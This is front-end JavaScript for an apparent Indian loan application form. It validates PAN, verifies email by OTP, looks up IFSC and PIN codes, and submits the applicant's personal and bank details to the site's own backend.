// 🟢 User's Direct & Smooth Touch Logic 🟢
const touchDot = document.getElementById("touchPointer");

document.addEventListener("touchstart", function(e){
    let touch = e.touches[0];
    if(touchDot) {
        touchDot.style.left = touch.clientX + "px";
        touchDot.style.top = touch.clientY + "px";
        touchDot.style.display = "block";
    }
}, {passive: true});

document.addEventListener("touchmove", function(e){
    let touch = e.touches[0];
    if(touchDot) {
        touchDot.style.left = touch.clientX + "px";
        touchDot.style.top = touch.clientY + "px";
    }
}, {passive: true});

document.addEventListener("touchend", function(){
    if(touchDot) touchDot.style.display = "none";
});

// আপনার Render সার্ভারের লিঙ্ক (শেষে / থাকবে না)
const BASE_URL = 'https://pratishkafinanceltd.onrender.com';

// 1. Strict PAN Checking Logic
function checkPAN() {
    const pan = document.getElementById("pan").value.toUpperCase();
    const error = document.getElementById("panError");
    const panRegex = /^[A-Z]{3}P[A-Z][0-9]{4}[A-Z]$/;

    if(pan.length === 10) {
        if(!panRegex.test(pan)) {
            error.style.display = "block";
            document.getElementById("submitBtn").disabled = true;
        } else {
            error.style.display = "none";
            document.getElementById("submitBtn").disabled = false;
        }
    } else {
        error.style.display = "none";
    }
}

// 2. EMAIL VERIFICATION
let isEmailVerified = false;

window.sendEmailOTP = async function() {
    const email = document.getElementById('email').value;
    const emailError = document.getElementById('emailError');

    if (!email || !email.includes('@')) {
        emailError.innerText = 'Please enter a valid email address';
        emailError.style.display = 'block';
        return;
    }

    try {
        const btn = event.target;
        const originalText = btn.innerText;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';

        const response = await fetch(`${BASE_URL}/api/send-email-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email })
        });

        const data = await response.json();
        btn.innerHTML = originalText;

        if (data.success) {
            document.getElementById('emailOTPBox').style.display = 'block';
            emailError.style.display = 'none';
            alert('OTP sent to ' + email);
        } else {
            emailError.innerText = data.message || 'Error sending OTP';
            emailError.style.display = 'block';
        }
    } catch (error) {
        emailError.innerText = 'Network error. Could not send OTP.';
        emailError.style.display = 'block';
    }
};

window.verifyEmailOTP = async function() {
    const email = document.getElementById('email').value;
    const otp = document.getElementById('emailOTP').value;
    const emailError = document.getElementById('emailError');
    const emailSuccess = document.getElementById('emailSuccess');

    try {
        const btn = event.target;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';

        const response = await fetch(`${BASE_URL}/api/verify-email-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, otp })
        });

        const data = await response.json();
        btn.innerHTML = 'Verify OTP';

        if (data.success) {
            isEmailVerified = true;
            emailSuccess.style.display = 'block';
            emailError.style.display = 'none';
            document.getElementById('emailOTPBox').style.display = 'none';
            document.querySelector('button[onclick="sendEmailOTP()"]').disabled = true;
        } else {
            emailError.innerText = data.message || 'Invalid OTP';
            emailError.style.display = 'block';
        }
    } catch (error) {
        emailError.innerText = 'Network error. Could not verify OTP.';
        emailError.style.display = 'block';
    }
};

// 3. BANK & IFSC LOGIC (unchanged)
function updateBankLogo() {
    const selectElement = document.getElementById("bankName");
    const selectedOption = selectElement.options[selectElement.selectedIndex];
    const logoUrl = selectedOption.getAttribute("data-logo");
    const logoImg = document.getElementById("bankLogo");
    if (logoUrl) { logoImg.src = logoUrl; logoImg.style.display = "block"; }
    else { logoImg.style.display = "none"; }
}

function checkAccMatch() {
    const acc = document.getElementById("accNumber").value;
    const confirmAcc = document.getElementById("confirmAccNumber").value;
    const error = document.getElementById("accError");
    if (confirmAcc.length > 0 && acc !== confirmAcc) {
        error.style.display = "block"; 
    } else {
        error.style.display = "none";
    }
}

async function verifyIFSC() {
    const ifscInput = document.getElementById("ifsc").value.toUpperCase();
    const errorMsg = document.getElementById("ifscError");
    const successMsg = document.getElementById("ifscSuccess");
    const branchName = document.getElementById("branchName");

    if (ifscInput.length === 11) {
        try {
            const response = await fetch(`https://ifsc.razorpay.com/${ifscInput}`);
            if (response.status === 200) {
                const data = await response.json();
                branchName.value = `${data.BRANCH}, ${data.CITY}`;
                successMsg.innerHTML = "Verified: " + data.BANK;
                successMsg.style.display = "block";
                errorMsg.style.display = "none";
            } else { throw new Error(); }
        } catch (error) {
            errorMsg.style.display = "block";
            successMsg.style.display = "none";
        }
    }
}

// 4. PIN CODE LOGIC
async function fetchAddress() {
    const pin = document.getElementById('pincode').value;
    const districtInput = document.getElementById('district');
    const areaSelect = document.getElementById('areaSelect');

    if (pin.length === 6) {
        try {
            const response = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
            const data = await response.json();
            if (data[0].Status === "Success") {
                districtInput.value = data[0].PostOffice[0].District;
                areaSelect.innerHTML = '<option value="">Select your area...</option>';
                data[0].PostOffice.forEach(po => {
                    let option = document.createElement('option');
                    option.value = po.Name;
                    option.innerText = po.Name;
                    areaSelect.appendChild(option);
                });
            }
        } catch (error) { console.log("PIN Error"); }
    }
}

// 5. FINAL FORM SUBMISSION
document.getElementById("loanForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    if(!isEmailVerified) {
        alert("Please verify your email address before final submission.");
        return;
    }

    const btn = document.getElementById("submitBtn");
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
    btn.disabled = true;

    const formData = {
        fullName: document.getElementById("fullName").value,
        email: document.getElementById("email").value,
        mobile: document.getElementById("mobile").value,
        amount: document.getElementById("amount").value,
        pan: document.getElementById("pan").value,
        aadhaar: document.getElementById("aadhaar").value,
        bankName: document.getElementById("bankName").value,
        accNumber: document.getElementById("accNumber").value,
        ifsc: document.getElementById("ifsc").value,
        branch: document.getElementById("branchName").value,
        area: document.getElementById("areaSelect").value,
        address: document.getElementById("fullAddress").value
    };

    try {
        const response = await fetch(`${BASE_URL}/api/apply`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        });

        const data = await response.json();

        if(data.success) {
            alert("✅ Application Submitted Successfully!");
            this.reset();
            isEmailVerified = false;
        } else {
            alert("❌ Error: " + data.message);
        }
    } catch (error) {
        alert("⚠️ Connection Error! Please try again.");
    } finally {
        btn.innerHTML = 'Submit Secure Application';
        btn.disabled = false;
    }
});
